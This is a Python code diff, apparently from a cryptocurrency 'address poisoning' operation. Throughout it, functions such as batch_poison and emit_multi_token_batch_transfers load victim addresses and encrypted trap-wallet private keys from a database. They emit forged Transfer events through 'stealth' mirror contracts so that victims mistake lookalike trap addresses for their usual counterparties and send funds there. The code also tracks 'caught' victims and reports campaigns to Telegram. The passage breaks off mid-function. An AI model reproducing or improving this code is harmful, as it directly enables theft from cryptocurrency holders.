+    Emit multiple forged Transfer events in a SINGLE transaction.
+    """
+    if len(victims) != len(traps) or len(victims) != len(amounts):
+        logger.error("[batch-mirror] Mismatched array lengths")
+        return None
+    
+    # 🚀 FIX: Route to the correct stealth contract based on the batch's asset
+    contract_address = (
+        MIRROR_CONTRACTS.get(asset) or 
+        MIRROR_CONTRACTS.get(asset.upper()) or 
+        MIRROR_TOKEN_NATIVE
+    )
+    if not contract_address:
+        logger.warning(f"[batch-mirror] No contract configured for {asset}")
+        return None
+    
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[batch-mirror] No funding key for campaign {campaign_id}")
+        return None
+    
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        contract = w3.eth.contract(
+            address=w3.to_checksum_address(contract_address),
+            abi=MIRROR_ABI
+        )
+        
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[batch-mirror]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+        
+        estimated_gas = 50000 + (15000 * len(victims))
+        
+        victims_checksum = [w3.to_checksum_address(v) for v in victims]
+        traps_checksum = [w3.to_checksum_address(t) for t in traps]
+        
+        tx = contract.functions.batchEmitTransfers(
+            victims_checksum,
+            traps_checksum,
+            amounts
+        ).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "batch-mirror"):
+            return None
+        
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[batch-mirror] Batch emission sent: {len(victims)} transfers in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[batch-mirror] ✅ Batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[batch-mirror] ❌ Batch tx reverted")
+            return None
+    
+    except Exception as e:
+        logger.error(f"[batch-mirror] Failed to emit batch: {e}")
+        return None
+
+
+def emit_multi_token_batch_transfers(queue, campaign_id):
+    """
+    Emit multiple forged Transfer events for DIFFERENT tokens in a SINGLE transaction
+    using the MultiTokenBatchRouter contract.
+    """
+    if not MULTI_TOKEN_ROUTER:
+        logger.error("[multi-batch] MULTI_TOKEN_ROUTER not configured in .env")
+        return None
+        
+    operator_key = get_mirror_operator_key(campaign_id)
+    if not operator_key:
+        logger.warning(f"[multi-batch] No funding key for campaign {campaign_id}")
+        return None
+        
+    try:
+        operator_account = w3.eth.account.from_key(operator_key)
+        operator_addr = operator_account.address
+        
+        router_contract = w3.eth.contract(
+            address=w3.to_checksum_address(MULTI_TOKEN_ROUTER),
+            abi=MULTI_TOKEN_ROUTER_ABI
+        )
+        
+        # Group queue items by asset (contract address)
+        asset_groups = {}
+        for q in queue:
+            asset = q['asset']
+            contract_address = (
+                MIRROR_CONTRACTS.get(asset) or 
+                MIRROR_CONTRACTS.get(asset.upper()) or 
+                MIRROR_TOKEN_NATIVE
+            )
+            if not contract_address:
+                logger.warning(f"[multi-batch] No contract for asset {asset}, skipping")
+                continue
+                
+            if contract_address not in asset_groups:
+                asset_groups[contract_address] = []
+            asset_groups[contract_address].append(q)
+            
+        if not asset_groups:
+            logger.error("[multi-batch] No valid assets to batch")
+            return None
+            
+        # Build the BatchCall structs (using tuples for max web3.py compatibility)
+        calls = []
+        total_transfers = 0
+        for contract_addr, items in asset_groups.items():
+            froms = [w3.to_checksum_address(q['victim']) for q in items]
+            tos = [w3.to_checksum_address(q['trap']) for q in items]
+            values = [q['amount'] for q in items]
+            total_transfers += len(items)
+            
+            calls.append((
+                w3.to_checksum_address(contract_addr),
+                froms,
+                tos,
+                values
+            ))
+            
+        logger.info(f"[multi-batch] Fetching nonce for {operator_addr}...")
+        nonce = call_with_retry(w3.eth.get_transaction_count, operator_addr, "pending")
+        logger.info(f"[multi-batch] Got nonce: {nonce}")
+        
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        use_eip1559 = (
+            "baseFeePerGas" in latest_block
+            and latest_block["baseFeePerGas"] is not None
+            and CHAIN.lower() != "bsc"
+        )
+        
+        gas_params = {}
+        if use_eip1559:
+            gas_params = get_smart_gas_params(w3, context="[multi-batch]", campaign_id=campaign_id)
+        else:
+            gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
+            
+        estimated_gas = 50000 + (15000 * total_transfers)
+        
+        tx = router_contract.functions.transfer(calls).build_transaction({
+            'from': operator_addr,
+            'nonce': nonce,
+            'gas': estimated_gas,
+            'chainId': w3.eth.chain_id,
+            **gas_params
+        })
+        
+        # 🚀 DRY Refactor: Use shared balance checker
+        if not check_operator_balance_and_alert(w3, operator_addr, estimated_gas, gas_params, campaign_id, "multi-batch"):
+            return None
+            
+        logger.info(f"[multi-batch] Signing transaction...")
+        signed = w3.eth.account.sign_transaction(tx, operator_key)
+        raw_tx = getattr(signed, 'raw_transaction', getattr(signed, 'rawTransaction', None))
+        
+        logger.info(f"[multi-batch] Broadcasting to RPC...")
+        tx_hash = w3.eth.send_raw_transaction(raw_tx)
+        
+        logger.info(f"[multi-batch] Multi-token batch sent: {total_transfers} transfers across {len(calls)} tokens in tx={tx_hash.hex()}")
+        
+        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300) # 🚀 5 minutes
+        if receipt.status == 1:
+            logger.info(f"[multi-batch] ✅ Multi-token batch confirmed in block {receipt.blockNumber}")
+            return tx_hash.hex()
+        else:
+            logger.error(f"[multi-batch] ❌ Multi-token batch reverted")
+            return None
+            
+    except Exception as e:
+        logger.error(f"[multi-batch] Failed to emit multi-token batch: {e}")
+        return None    
+
+
+def get_web3():
+    get_var = lambda name: getattr(config, name, None) or os.getenv(name)
+
+    raw_urls = [
+        get_var("RPC_URL"),
+        get_var("DUSTER_RPC_URL"),
+        get_var("NODE_RPC_URL"),
+    ] + getattr(config, "FALLBACK_RPC_URLS", []) + PUBLIC_RPC_FALLBACKS.get(CHAIN.lower(), [])
+
+    rpc_urls = list(dict.fromkeys([url for url in raw_urls if url]))
+
+    print(f'[DEBUG] Trying {len(rpc_urls)} RPC URLs...')
+
+    for url in rpc_urls:
+        try:
+            print(f'[DEBUG] Connecting to {url}...')
+            provider = Web3.HTTPProvider(url, request_kwargs={'timeout': 30})
+            w3 = Web3(provider)
+
+            if w3.is_connected():
+                if CHAIN.lower() in ('bsc', 'polygon') and geth_poa_middleware is not None:
+                    try:
+                        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
+                    except Exception as e:
+                        print(f'[DEBUG] POA middleware injection skipped/failed: {e}')
+
+                logger.info(f"Connected to RPC: {url}")
+                return w3
+        except Exception as e:
+            print(f'[DEBUG] Connection failed for {url}: {e}')
+            continue
+
+    logger.critical("No RPC connection available.")
+    sys.exit(1)
+
+w3 = get_web3()
+print('[DEBUG] Web3 instance ready.')
+
+VAULT_FILE = config.VAULT_FILE
+
+ERC20_ABI = [
+    {
+        "constant": False,
+        "inputs": [{"name": "to", "type": "address"}, {"name": "value", "type": "uint256"}],
+        "name": "transfer",
+        "outputs": [{"name": "", "type": "bool"}],
+        "type": "function",
+    },
+    {
+        "constant": True,
+        "inputs": [{"name": "owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "", "type": "uint256"}],
+        "type": "function",
+    },
+]
+
+_last_gas_insufficient_alert = {}
+
+def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
+    last_exc = None
+    for attempt in range(1, max_attempts + 1):
+        try:
+            return func(*args, **kwargs)
+        except Exception as e:
+            last_exc = e
+            err_str = str(e).lower()
+            if attempt < max_attempts:
+                delay = base_delay * (2 ** (attempt - 1))
+                if "429" in err_str or "too many requests" in err_str or "limit" in err_str:
+                    delay = max(delay, 5)
+                logger.warning(f"Retry {attempt}/{max_attempts} for {func.__name__} after {delay}s: {e}")
+                time.sleep(delay)
+            else:
+                raise
+    raise last_exc
+
+
+
+def get_native_reserve_wei(chain_name):
+    """Calculates the Wei equivalent of the GAS_RESERVE_USD for the native coin."""
+    try:
+        # CoinGecko IDs for the 3 supported chains
+        symbol_map = {"ethereum": "ethereum", "bsc": "binancecoin", "polygon": "matic-network"}
+        coin_id = symbol_map.get(chain_name.lower(), "ethereum")
+        
+        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coin_id}&vs_currencies=usd"
+        req = urllib.request.Request(url, headers={'User-Agent': 'CipherNet/1.0'})
+        with urllib.request.urlopen(req, timeout=3) as response:
+            data = json.loads(response.read().decode())
+            price = data[coin_id]['usd']
+            
+            # Calculate exact Wei needed for the USD reserve (all 3 chains use 18 decimals)
+            reserve_native = GAS_RESERVE_USD / price
+            return int(reserve_native * (10 ** 18))
+            
+    except Exception:
+        # Safe fallback reserves using conservative worst-case prices 
+        # to ensure the trap ALWAYS keeps at least the GAS_RESERVE_USD value
+        worst_case_prices = {
+            "ethereum": 4000,   # Assumes ETH <= $4000
+            "bsc": 700,         # Assumes BNB <= $700
+            "polygon": 1.0      # Assumes MATIC <= $1.00
+        }
+        price = worst_case_prices.get(chain_name.lower(), 4000)
+        return int((GAS_RESERVE_USD / price) * (10 ** 18))
+
+def read_vault_lines(file_path):
+    lines = []
+    if not os.path.exists(file_path):
+        return lines
+    with open(file_path, 'r') as f:
+        raw_lines = f.readlines()
+        for idx, raw_line in enumerate(raw_lines):
+            line = raw_line.strip()
+            if not line:
+                continue
+            try:
+                decrypted = decrypt(line)
+                lines.append(decrypted)
+            except Exception as e:
+                logger.error(f"Failed to decrypt line {idx+1}: {e}")
+                continue
+    return lines
+
+def get_trap_entries_from_db(campaign_id):
+    entries = []
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return entries
+    try:
+        result = supabase.table("traps")\
+            .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+            .eq("campaign_id", campaign_id)\
+            .execute()
+        if not result.data:
+            logger.info(f"No traps found for campaign {campaign_id}")
+            return entries
+        for row in result.data:
+            enc_key = row.get("trap_private_key_enc")
+            if not enc_key:
+                continue
+            try:
+                private_key = decrypt(enc_key)
+                w3.eth.account.from_key(private_key)
+                victim = row.get("victim_address", "").lower()
+                dust_count = row.get("dust_count", 0) or 0
+                trap_id = row.get("id")
+                counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
+                if victim:
+                    entries.append((trap_id, victim, private_key, dust_count, counterparty))
+            except Exception as e:
+                logger.error(f"Failed to decrypt private key for victim {row.get('victim_address')}: {e}")
+                continue
+        logger.info(f"Loaded {len(entries)} trap entries from database for campaign {campaign_id}")
+    except Exception as e:
+        logger.error(f"Failed to fetch traps from database: {e}")
+    return entries
+
+
+def get_trap_entries_by_ids(trap_ids):
+    """Fetch specific traps by their IDs. Returns list of (trap_id, victim, key, dust_count, counterparty) tuples."""
+    entries = []
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return entries
+    if not trap_ids:
+        return entries
+    try:
+        for i in range(0, len(trap_ids), 500):
+            chunk = trap_ids[i:i + 500]
+            result = supabase.table("traps")\
+                .select("id, victim_address, trap_private_key_enc, dust_count, counterparty_address")\
+                .in_("id", chunk)\
+                .execute()
+            if not result.data:
+                continue
+            for row in result.data:
+                enc_key = row.get("trap_private_key_enc")
+                if not enc_key:
+                    continue
+                try:
+                    private_key = decrypt(enc_key)
+                    w3.eth.account.from_key(private_key)
+                    victim = row.get("victim_address", "").lower()
+                    dust_count = row.get("dust_count", 0) or 0
+                    counterparty = row.get("counterparty_address", "").lower() if row.get("counterparty_address") else ""
+                    if victim:
+                        entries.append((row.get("id"), victim, private_key, dust_count, counterparty))
+                except Exception as e:
+                    logger.error(f"Failed to decrypt private key for trap {row.get('id')}: {e}")
+                    continue
+        logger.info(f"Loaded {len(entries)} filtered trap entries by IDs")
+    except Exception as e:
+        logger.error(f"Failed to fetch traps by IDs: {e}")
+    return entries
+
+
+def update_trap_dust_count(trap_id):
+    """Increment dust_count and update last_dusted_at for a trap."""
+    if not supabase or not trap_id:
+        return
+    
+    now_iso = datetime.now(timezone.utc).isoformat()
+    
+    for attempt in range(3):
+        try:
+            # Fetch current dust_count, increment, and update
+            result = supabase.table("traps").select("dust_count").eq("id", trap_id).execute()
+            current_count = 0
+            if result.data and len(result.data) > 0:
+                current_count = result.data[0].get("dust_count", 0) or 0
+            
+            supabase.table("traps").update({
+                "dust_count": current_count + 1,
+                "last_dusted_at": now_iso
+            }).eq("id", trap_id).execute()
+            
+            # Success - break out of retry loop
+            return
+            
+        except Exception as e:
+            err_str = str(e).lower()
+            logger.warning(f"Failed to update dust_count for trap {trap_id} (attempt {attempt + 1}/3): {e}")
+            
+            # If it's a connection error, wait before retrying
+            if "broken pipe" in err_str or "connection" in err_str or "timeout" in err_str:
+                if attempt < 2:
+                    logger.info(f"Connection error detected. Retrying in 3 seconds...")
+                    time.sleep(3)
+                    continue
+            
+            # If it's not a connection error, don't retry
+            break
+    
+    logger.error(f"All 3 attempts failed for dust_count update on trap {trap_id}")
+
+
+def get_counterparty_from_db(victim_address, campaign_id):
+    """Fetch the counterparty address for a specific victim from the traps table."""
+    if not supabase:
+        logger.error("Supabase client not initialized.")
+        return None
+    try:
+        result = supabase.table("traps")\
+            .select("counterparty_address")\
+            .eq("campaign_id", campaign_id)\
+            .eq("victim_address", victim_address.lower())\
+            .limit(1)\
+            .maybe_single()\
+            .execute()
+        if result.data:
+            return result.data.get("counterparty_address")
+        return None
+    except Exception as e:
+        logger.error(f"Failed to fetch counterparty for victim {victim_address}: {e}")
+        return None
+
+
+def parse_cached_amount(amount_str, asset):
+    """
+    Parse cached amount from any format the database might have stored it in.
+    Returns the amount in smallest units (wei for native, raw units for ERC-20).
+    """
+    if not amount_str:
+        return 0
+    
+    amount_str = str(amount_str).strip()
+    
+    # Hex string (e.g., "0x21c94ac0") — ERC-20 raw units from Alchemy
+    if amount_str.startswith('0x') or amount_str.startswith('0X'):
+        return int(amount_str, 16)
+    
+    # Decimal float (e.g., "15.988555750235143") — native coin in human-readable form
+    if '.' in amount_str:
+        try:
+            value_float = float(amount_str)
+            if asset in ('ETH', 'BNB', 'MATIC', 'ETH', 'WETH'):
+                # Native coins: 18 decimals
+                return int(value_float * (10 ** 18))
+            elif asset in ('USDC', 'USDT', 'USDP', 'TUSD', 'FRAX', 'BUSD', 'USDCe'):
+                # Stablecoins: 6 decimals (USDC/USDT) or 18 decimals (DAI)
+                if asset == 'DAI':
+                    return int(value_float * (10 ** 18))
+                return int(value_float * (10 ** 6))
+            elif asset in ('WBTC', 'renBTC'):
+                # Wrapped BTC: 8 decimals
+                return int(value_float * (10 ** 8))
+            else:
+                # Default to 18 decimals for unknown tokens
+                return int(value_float * (10 ** 18))
+        except (ValueError, OverflowError):
+            return 0
+    
+    # Plain integer string (e.g., "3136" or "15000000000000000000")
+    try:
+        value = int(amount_str)
+        # If it looks like a human-readable number (very small), convert to wei
+        if value < 1000000 and asset in ('ETH', 'BNB', 'MATIC'):
+            return int(value * (10 ** 18))
+        return value
+    except ValueError:
+        return 0
+    
+
+def fetch_last_transfer_from_blockchain(victim_address, counterparty_address, trap_id=None):
+    """
+    Fetch the most recent transfer with database caching.
+    
+    Strategy:
+    1. Check database cache first
+    2. If cache exists, only query from cached block to latest
+    3. Update cache after successful query
+    4. Fall back to full history only on first run
+    """
+    try:
+        victim_checksum = w3.to_checksum_address(victim_address)
+        counterparty_checksum = w3.to_checksum_address(counterparty_address)
+        victim_lower = victim_address.lower()
+        counterparty_lower = counterparty_address.lower()
+        
+        # Check database cache
+        from_block = '0x0'  # Default to full history
+        cached_asset = None
+        cached_amount = None
+        
+        if trap_id and supabase:
+            result = supabase.table('traps').select(
+                'last_transfer_block, last_transfer_asset, last_transfer_amount'
+            ).eq('id', trap_id).single().execute()
+            
+            if result.data and result.data.get('last_transfer_block'):
+                cached_block = result.data['last_transfer_block']
+                cached_asset = result.data['last_transfer_asset']
+                cached_amount = result.data['last_transfer_amount']
+                
+                # Only query from cached block to latest (much faster)
+                from_block = hex(cached_block + 1)  # Start from block after last cached
+                logger.info(f"[Cache] Found cached transfer at block {cached_block}, querying from {from_block}")
+        
+        # Try Alchemy APIs (with rate limit handling from previous fix)
+        alchemy_urls = ALCHEMY_RPCS.get(CHAIN.lower(), [])
+        alchemy_errors = []
+        
+        for url_idx, url in enumerate(alchemy_urls):
+            try:
+                alchemy_w3 = Web3(Web3.HTTPProvider(url, request_kwargs={'timeout': 10}))
+                if not alchemy_w3.is_connected():
+                    continue
+                
+                categories = ['external', 'erc20']
+                if CHAIN.lower() in ('ethereum', 'polygon'):
+                    categories.append('internal')
+                
+                result = alchemy_w3.provider.make_request('alchemy_getAssetTransfers', [{
+                    'fromBlock': from_block,
+                    'toBlock': 'latest',
+                    'fromAddress': victim_checksum,
+                    'toAddress': counterparty_checksum,
+                    'category': categories,
+                    'order': 'desc',
+                    'maxCount': '0x5',
+                    'withMetadata': True,  # Include block metadata for caching
+                }])
+                
+                if 'result' in result and result['result'].get('transfers'):
+                    transfers = result['result']['transfers']
+                    
+                    for t in transfers:
+                        if (t.get('from', '').lower() == victim_lower and 
+                            t.get('to', '').lower() == counterparty_lower):
+                            
+                            # Extract block number for caching
+                            block_hex = t.get('blockNum', '0x0')
+                            block_num = int(block_hex, 16)
+                            
+                            # Native transfer
+                            if t.get('category') == 'external':
+                                value_raw = t.get('value', 0)
+                                if isinstance(value_raw, str):
+                                    try:
+                                        value_float = float(value_raw)
+                                        value_wei = int(value_float * (10 ** 18))
+                                    except ValueError:
+                                        if value_raw.startswith('0x'):
+                                            value_wei = int(value_raw, 16)
+                                        else:
+                                            value_wei = int(value_raw)
+                                else:
+                                    value_wei = int(float(value_raw) * (10 ** 18))
+                                
+                                if value_wei > 0:
+                                    logger.info(f"[Alchemy] Found {NATIVE_SYMBOL} transfer: {w3.from_wei(value_wei, 'ether')} ETH at block {block_num}")
+                                    
+                                    # Update cache
+                                    update_transfer_cache(trap_id, block_num, NATIVE_SYMBOL, str(value_wei))
+                                    
+                                    return (NATIVE_SYMBOL, value_wei)
+                            
+                            # ERC-20 transfer
+                            elif t.get('category') == 'erc20':
+                                raw_contract = t.get('rawContract', {})
+                                raw_hex = raw_contract.get('value')
+                                
+                                if raw_hex:
+                                    value_units = int(raw_hex, 16)
+                                else:
+                                    token_addr = raw_contract.get('address', '').lower()
+                                    decimals = 6
+                                    for sym, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_addr:
+                                            decimals = config.get_token_decimals().get(sym, 6) if hasattr(config, 'get_token_decimals') else 6
+                                            break
+                                    value_units = int(float(t.get('value', 0)) * (10 ** decimals))
+                                
+                                if value_units > 0:
+                                    token_contract = raw_contract.get('address', '').lower()
+                                    for symbol, addr in TOKEN_CONFIG.items():
+                                        if addr.lower() == token_contract:
+                                            logger.info(f"[Alchemy] Found {symbol} transfer: {value_units} units at block {block_num}")
+                                            
+                                            # Update cache
+                                            update_transfer_cache(trap_id, block_num, symbol, str(value_units))
+                                            
+                                                        #    /* fix */
+                                            return (symbol, value_units)
+                
+                # No new transfers found since cached block
+                if cached_asset and cached_amount:
+                    parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+                    logger.info(f"[Cache] No new transfers since block {cached_block}, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                    return (cached_asset, parsed_amount)
+                
+                # First run - no cache and no transfers found
+                logger.info(f"[Alchemy] No transfers found in history")
+                return (None, None)
+                
+            except Exception as e:
+                err_str = str(e)
+                logger.warning(f"[Alchemy:{url[:30]}...] Failed: {err_str[:200]}")
+                alchemy_errors.append((url[:30], err_str[:100]))
+                
+                # Rate limit handling
+                err_lower = err_str.lower()
+                if '429' in err_lower or 'rate limit' in err_lower or 'too many requests' in err_lower:
+                    if url_idx < len(alchemy_urls) - 1:
+                        logger.info(f"[Alchemy] Rate limited, waiting 2s before next URL...")
+                        time.sleep(2)
+                continue
+        
+               # All Alchemy URLs failed
+        if cached_asset and cached_amount:
+            # Use cached data if available
+            parsed_amount = parse_cached_amount(cached_amount, cached_asset)
+            if parsed_amount > 0:
+                logger.warning(f"[Cache] Alchemy failed, using cached: {cached_amount} {cached_asset} → {parsed_amount} units")
+                return (cached_asset, parsed_amount)
+            else:
+                logger.error(f"[Cache] Could not parse cached amount: '{cached_amount}' for {cached_asset}")
+        
+        # No cache and all APIs failed - skip this victim
+        logger.error(f"[SKIP] All Alchemy URLs failed and no cache available for {victim_address}")
+        return (None, None)
+        
+    except Exception as e:
+        logger.error(f"[RPC] Error fetching last transfer: {e}")
+        return (None, None)
+
+
+def update_transfer_cache(trap_id, block_num, asset, amount):
+    """Update the transfer cache in the database."""
+    if not trap_id or not supabase:
+        return
+    
+    try:
+        supabase.table('traps').update({
+            'last_transfer_block': block_num,
+            'last_transfer_asset': asset,
+            'last_transfer_amount': amount,
+            'last_transfer_timestamp': datetime.now(timezone.utc).isoformat()
+        }).eq('id', trap_id).execute()
+        logger.debug(f"[Cache] Updated cache for trap {trap_id}: block {block_num}, {amount} {asset}")
+    except Exception as e:
+        logger.warning(f"[Cache] Failed to update cache for trap {trap_id}: {e}")
+
+
+def send_batch_telegram_notifications(queue, tx_hash, campaign_id, is_final=False):
+    """
+    Splits a batch of transactions into multiple Telegram messages 
+    to respect Telegram's 4096 character limit per message.
+    """
+    try:
+        tx_url = get_explorer_url(tx_hash, 'tx')
+        
+        # 🚀 REDUCED TO 10: 20 items was ~4300 chars (still over the 4096 limit).
+        # 10 items guarantees we stay around ~2300 chars per message.
+        CHUNK_SIZE = 10
+        chunks = [queue[i:i + CHUNK_SIZE] for i in range(0, len(queue), CHUNK_SIZE)]
+        
+        title = "🪞 *Final Batch Mirror Events!*" if is_final else "🪞 *Batch Mirror Events Emitted!*"
+        
+        for chunk_idx, chunk in enumerate(chunks):
+            # Add part number if there are multiple messages
+            if len(chunks) > 1:
+                header = f"{title} (Part {chunk_idx + 1}/{len(chunks)})\n\n"
+            else:
+                header = f"{title}\n\n"
+                
+            header += f"👥 Processed: {len(queue)} victims\n"
+            header += f"🔗 [View TX on Explorer]({tx_url})\n\n"
+            
+            msg = header
+            
+            # Calculate the starting index for continuous numbering across messages
+            start_idx = chunk_idx * CHUNK_SIZE + 1
+            
+            for idx, q in enumerate(chunk, start_idx):
+                # Safely handle asset string
+                asset_str = str(q['asset']) if q['asset'] else 'ETH'
+                decimals = get_token_decimals(asset_str)
+                amount_display = q['amount'] / (10 ** decimals)
+                victim_url = get_explorer_url(q['victim'])
+                trap_url = get_explorer_url(q['trap'])
+                
+                msg += f"*{idx}.* ({amount_display:.4f} {asset_str})\n"
+                msg += f"👤 [Victim]({victim_url})\n"
+                msg += f"🪤 [Trap]({trap_url})\n\n"
+                
+            send_telegram(msg, campaign_id=campaign_id)
+            
+    except Exception as e:
+        # 🚀 Catch and log any hidden Telegram formatting or API errors
+        logger.error(f"[Telegram] Failed to send batch notification: {e}")
+
+
+def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
+    has_trap_ids = trap_ids is not None and len(trap_ids) > 0
+    
+
+    if has_trap_ids:
+        logger.info(f"Using filtered mode: {len(trap_ids)} specific trap IDs")
+        filtered_entries = get_trap_entries_by_ids(trap_ids)
+        if not filtered_entries:
+            logger.error("No traps found for the provided IDs")
+            return
+        entries = filtered_entries
+    elif campaign_id:
+        logger.info(f"Using database for campaign {campaign_id}")
+        entries = get_trap_entries_from_db(campaign_id)
+        if not entries:
+            logger.error(f"No traps found for campaign {campaign_id}")
+            return
+    else:
+        logger.info("Using vault file for legacy mode")
+        if not os.path.exists(VAULT_FILE):
+            logger.error(f"{VAULT_FILE} not found.")
+            return
+        decrypted_lines = read_vault_lines(VAULT_FILE)
+        if not decrypted_lines:
+            logger.error("No valid (decrypted) entries found in vault.txt")
+            return
+        entries = []
+        for line in decrypted_lines:
+            match = re.search(r"Victim:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
+            if match:
+                # Legacy mode: no trap_id, no dust_count, no counterparty
+                entries.append((None, match.group(1), match.group(2), 0, None))
+            else:
+                match = re.search(r"Target:\s*(0x[a-fA-F0-9]{40}).*Key:\s*(0x[a-fA-F0-9]{64})", line, re.IGNORECASE)
+                if match:
+                    entries.append((None, match.group(1), match.group(2), 0, None))
+
+    if not entries:
+        logger.error("No valid entries found")
+        return
+
+    CAUGHT_FILE = config.CAUGHT_FILE
+    caught = set()
+    if os.path.exists(CAUGHT_FILE):
+        try:
+            with open(CAUGHT_FILE, 'r') as f:
+                data = f.read()
+                if data.strip():
+                    for line in data.split('\n'):
+                        addr = line.strip().lower()
+                        if addr:
+                            caught.add(addr)
+            logger.info(f"Loaded {len(caught)} caught victims from {CAUGHT_FILE}")
+        except Exception as e:
+            logger.warning(f"Could not read caught victims file: {e}")
+
+    # 🚀 CRITICAL: Define total right here before using it
+    total = len(entries)
+    logger.info(f"Found {total} victims. Processing with mirror events only...")
+    
+    if job_id:
+        update_job(job_id, total=total)
+        
+          # 🚀 BATCH PROCESSING: 400 items per multi-token batch to minimize gas fees
+    BATCH_SIZE = 400
+    
+    # 🚀 Send "Started" Telegram notification immediately
+    start_msg = (
+        f"🚀 *Manual Dusting Started*\n\n"
+        f"👥 Total victims: {total}\n"
+        f"⚙️ Processing batches of {BATCH_SIZE}..."
+    )
+    send_telegram(start_msg, campaign_id=campaign_id)
+
+    success = 0
+    gas_failures = 0
+    skipped_dusted = 0
+    poison_queue = []  # Single unified queue for all assets (multi-token batching)
+    
+    for i, entry in enumerate(entries, 1):
+        trap_id = entry[0]
+        victim = entry[1]
+        key = entry[2]
+        dust_count = entry[3]
+        counterparty = entry[4]
+            
+        if victim.lower() in caught:
+            logger.info(f"Skipping caught victim {victim}")
+            continue
+
+        # 🚀 SKIP ALREADY DUSTED TRAPS
+        if dust_count > 0:
+            logger.info(f"[{i}/{total}] Skipping already dusted victim {victim} (dust_count: {dust_count})")
+            skipped_dusted += 1
+            continue
+
+        logger.info(f"[{i}/{total}] Processing victim {victim}")
+        
+        trap_address = w3.eth.account.from_key(key).address.lower()
+        
+        if not counterparty:
+            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
+            continue
+        
+        # Fetch last transfer from blockchain (with caching)
+        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty} (trap_id: {trap_id})...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty, trap_id)
+        
+        if not fetched_asset or not fetched_amount:
+            # 🆕 Use default fallback: emit a small native transfer
+            logger.info(f"[{i}/{total}] No transfer found for {victim}, using default {NATIVE_SYMBOL} fallback")
+            fetched_asset = NATIVE_SYMBOL
+            fetched_amount = w3.to_wei(1, 'ether')
+        
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+        
+                # 🚀 Add to unified multi-token batch queue
+        poison_queue.append({
+            'victim': victim,
+            'trap': trap_address,
+            'amount': fetched_amount,
+            'asset': fetched_asset,
+            'trap_id': trap_id,
+        })
+        
+        # 🚀 Process batch when queue reaches BATCH_SIZE (700)
+        if len(poison_queue) >= BATCH_SIZE:
+            logger.info(f"[batch] Processing multi-token batch of {len(poison_queue)} victims...")
+            
+            batch_trap_ids = [q['trap_id'] for q in poison_queue if q['trap_id']]
+            
+            # Emit multi-token batch via Router
+            tx_hash = emit_multi_token_batch_transfers(poison_queue, campaign_id)
+            
+            if tx_hash:
+                success += len(poison_queue)
+                logger.info(f"[batch] ✅ Multi-token batch emitted: {len(poison_queue)} transfers in tx={tx_hash}")
+                
+                for tid in batch_trap_ids:
+                    update_trap_dust_count(tid)
+                    
+                send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
+                
+                # 🚀 NONCE SAFETY: Wait 2 seconds to let the RPC load-balancer sync the mined block 
+                # before the next batch fetches the 'pending' nonce. Prevents "nonce too low" errors.
+                time.sleep(2) 
+            else:
+                operator_key = get_mirror_operator_key(campaign_id)
+                if operator_key:
+                    try:
+                        operator_addr = w3.eth.account.from_key(operator_key).address
+                        operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+                        if operator_balance < w3.to_wei(0.0001, 'ether'):
+                            gas_failures += 1
+                            logger.warning(f"[batch] ❌ Multi-token batch failed (gas insufficient)")
+                            if gas_failures >= 3:
+                                logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures")
+                                poison_queue.clear()
+                                break
+                        else:
+                            logger.error(f"[batch] ❌ Multi-token batch failed (other reason)")
+                    except Exception:
+                        logger.error(f"[batch] ❌ Multi-token batch failed")
+                else:
+                    logger.error(f"[batch] ❌ Multi-token batch failed (no operator key)")
+            
+            poison_queue.clear()
+        
+        if job_id and i % 5 == 0:
+            update_job(job_id, progress=i)
+        time.sleep(0.5)  # Reduced delay since we're batching
+    
+        # 🚀 Process remaining items in queue (final multi-token batch)
+    if poison_queue:
+        logger.info(f"[batch] Processing final multi-token batch of {len(poison_queue)} victims...")
+        
